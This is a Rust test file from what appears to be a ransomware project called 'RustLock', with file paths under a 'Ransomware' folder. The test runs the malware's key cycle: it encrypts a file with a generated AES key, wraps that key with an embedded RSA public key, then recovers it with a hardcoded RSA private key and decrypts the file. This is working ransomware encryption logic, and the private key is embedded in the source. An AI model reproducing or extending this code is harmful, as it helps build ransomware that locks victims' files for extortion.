use rustlock::{decypher, cypher};
// TODO: Fix imports
use base64;
use rsa::pkcs8::DecodePrivateKey;
use rsa::pkcs8::DecodePublicKey;
use rsa::traits::PublicKeyParts;
use rsa::RsaPrivateKey;
use rsa::{Oaep, RsaPublicKey};
use sha2::Sha256;
use std::ffi::CString;

const PRIVATE_KEY: &str = r#"-----BEGIN PRIVATE KEY-----
MIIEvQIBADANBgkqhkiG9w0BAQEFAASCBKcwggSjAgEAAoIBAQCWCD1UOFtrDA1F
pR2KIWwFsdo1i9w2Y1tpmRBy4f+hSrmxAv9YkXyhrSh2kU3Em9MzO7/4jhC+QCRa
P7NLKN7KKYNYS4n6pDs0uaDdfM/4vJ9J3hhQiuluQ7W9rmXWlFmOv9plTLjaabka
WdLlKdu6yV8Lqk1kark4QP49b6k2bwbucXZcfjMYMDtHoHK9HPub7iGIrdedb7BF
fzG8atABMDXsAELNmLoWz3XTyF1ROYjn68F0WJGa5Ex+nlfdzI0KSvF97QL5rHXf
tKzuJ4IZjgO+TgHCIaulIQZDkwgCc7XcSkCJqLkmCnINlT5+S7VdQmQ2RTpdEhxI
2q/hMjPpAgMBAAECggEAHglTQeewgatdgtpuIgfT6QX0wjCYazkUBX2T2fQd6ewc
ZfBML66czX9tsOMhNyHdNA4bvkau2m/b90d2fS8W/1E1Tvl8i7XSdplNN9pzhoA4
waCZrJJK7nzWxz1BfSahEV+eeRZVkcCFwt1FyARLzcbf5OV47gghwb3dSG5w6Ykd
RMKUxgnbqPj8UrRelooi2uywz4z0qi40So2USS1+o7Xt1d02qwRX4lElReL81Sxp
u+LcmMXdiZ3NJIPUNey8vZbeT9dySxg1RRXWXNBm22nOXQhpfktTIqTWr1dl4bGn
3FOOZbKlmcYdiphKFSeCEj39UmI0lt/R2JkZBnK7wwKBgQDM9EFl136W2TsaJof3
AOMMai4gHeizqzMR8RefhPF/UqytWTKq82mywfxrU1BqEWckFRUajO43A/ZgrIJ5
IlwQnGznrvmxO4ugbQUuKNYUnvMJN15KY7tln+uGJQtldXes/gZC+czgWPQUbua9
EWqbfNyDLf+S62L8S4oFGw/bqwKBgQC7ZjJCR/lN5Ch8z1RCvnw6AAOyKCcc62GN
4GRa25HJPSuiLS++sfDs9V+wBE/mDnF99VA36RMcsxjo28v+2lO5EvsaQKD/c8yi
f3QkcwX7uJSQT1VIWrSkg9G945WIU1ZSpDD94QGMA+4KBNjQDDzAcOELN/KiJSl1
HB1ydog6uwKBgBJt4DeNIgfkbqkST+WJAeGK5qzio5sMSOJTIIGqjaCaSYao36J5
ksaNJOptqmxvNiwLbUNe6sitpYjZ2j2UNl0UA8Lte+xQ42RAiVe2OlHOXSI2BVeB
Eke4EpCUYir0XheDHAMHvUFrHj98HWlg2Io0twtgpnuKiPMQw89juJBTAoGAJfqm
QOyZSAHveqwCJay5PH/4P8kHdEL3+Gr7q7ZIK4KsLyf9PyaM71kjVWbqUnOm6KIo
6cvgxbY+XCL/itzwjteb8Ewc1OjBFkXCYgi1s7hK05xgalOHvLfCcDuJeKF7IzCH
hUxupdO+EGW/ExsHzPCTi1SBZf8mEcfq5+HB5jUCgYEAkPrAdjOnnmWkr72u7/Bn
+wfFRVeHCOmQDSN3+/sopZyqQdWvfV8uaPU3UEg2TmC28/Rr8IOD6HrxX/qbm/gh
GEPpxab8pRtDc9WxBNmaojQ2FYCF3J0c3oZ9VCRR+CyDcUWOE0LphMT59LlXM6h/
sb+ODQUmiQFB2eLUuYFe25o=
-----END PRIVATE KEY-----
"#;

pub const PUBLIC_KEY_PEM: &str = r#"-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAlgg9VDhbawwNRaUdiiFs
BbHaNYvcNmNbaZkQcuH/oUq5sQL/WJF8oa0odpFNxJvTMzu/+I4QvkAkWj+zSyje
yimDWEuJ+qQ7NLmg3XzP+LyfSd4YUIrpbkO1va5l1pRZjr/aZUy42mm5GlnS5Snb
uslfC6pNZGq5OED+PW+pNm8G7nF2XH4zGDA7R6ByvRz7m+4hiK3XnW+wRX8xvGrQ
ATA17ABCzZi6Fs9108hdUTmI5+vBdFiRmuRMfp5X3cyNCkrxfe0C+ax137Ss7ieC
GY4Dvk4BwiGrpSEGQ5MIAnO13EpAiai5JgpyDZU+fku1XUJkNkU6XRIcSNqv4TIz
6QIDAQAB
-----END PUBLIC KEY-----"#;

fn decypher_key(encrypted_aes_key: Vec<u8>) -> Vec<u8> {
    let private_key =
        RsaPrivateKey::from_pkcs8_pem(&PRIVATE_KEY).expect("Error parsing the private key");
    let padding = Oaep::new::<Sha256>();
    let aes_key = private_key
        .decrypt(padding, &encrypted_aes_key)
        .expect("Error decrypting the AES key");

    return aes_key;
}

#[test]
fn test_keys_cycle() {
    // 1. Generate an AES key (the "blob" concatenated with the generated key)
    let aes_key: Vec<u8> = cypher::lib::generate_key();

    let source_f =
        CString::new("C:\\Users\\user\\Ransomware\\RustLock\\tests\\assets\\plain.txt").unwrap();
    let dest_f =
        CString::new("C:\\Users\\user\\Ransomware\\RustLock\\tests\\assets\\cipher.txt").unwrap();
    cypher::cypher::encrypt(source_f, dest_f, aes_key.clone());

    // 2. Encrypt the AES key using the RSA public key
    let encrypted_key = cypher::lib::encrypt_aes_key(aes_key.clone(), PUBLIC_KEY_PEM);

    // 3. Verify that the size of the encrypted message matches the size of the RSA modulus.
    let public_key = RsaPublicKey::from_public_key_pem(cypher::config::PUBLIC_KEY_PEM)
        .expect("Error parsing the public key");
    let expected_size = public_key.size();

    assert_eq!(
        encrypted_key.len(),
        expected_size,
        "The size of the encrypted message must match the size of the RSA modulus."
    );

    // Print debugging information
    println!("Generated AES key ({} bytes): {:?}", aes_key.len(), aes_key);
    println!(
        "Encrypted AES key ({} bytes): {:?}",
        encrypted_key.len(),
        encrypted_key
    );

    let encoded_key = base64::encode(encrypted_key);
    println!("------------------------------------");
    println!("Base64: {}", encoded_key);
    println!("------------------------------------");
    let aes_key_encrypted = base64::decode(encoded_key).expect("Error decoding the AES key");

    println!(
        "Encrypted AES key ({} bytes): {:?}",
        aes_key_encrypted.len(),
        aes_key_encrypted
    );

    let aes_clean_key = decypher_key(aes_key_encrypted);

    println!("==========================================");
    println!(
        "Clean AES key ({} bytes): {:?}",
        aes_clean_key.len(),
        aes_clean_key
    );
    println!("==========================================");
    let b64_aes_clean = base64::encode(aes_clean_key.clone());
    let aes_pasep = base64::decode(b64_aes_clean).unwrap();
    println!("Clean AES key ({} bytes): {:?}", aes_pasep.len(), aes_pasep);
    println!("==========================================");

    let source_f =
        CString::new("C:\\Users\\user\\Ransomware\\RustLock\\tests\\assets\\cipher.txt").unwrap();
    let dest_f =
        CString::new("C:\\Users\\user\\Ransomware\\RustLock\\tests\\assets\\decypher.txt").unwrap();
    decypher::decypher::decrypt(source_f, dest_f, aes_clean_key);

    assert_eq!(
        aes_key,   // Newly generated key
        aes_pasep // AES key encrypted with RSA, base64 encoded, decoded, decrypted, re-encoded, and decoded again
    );
}
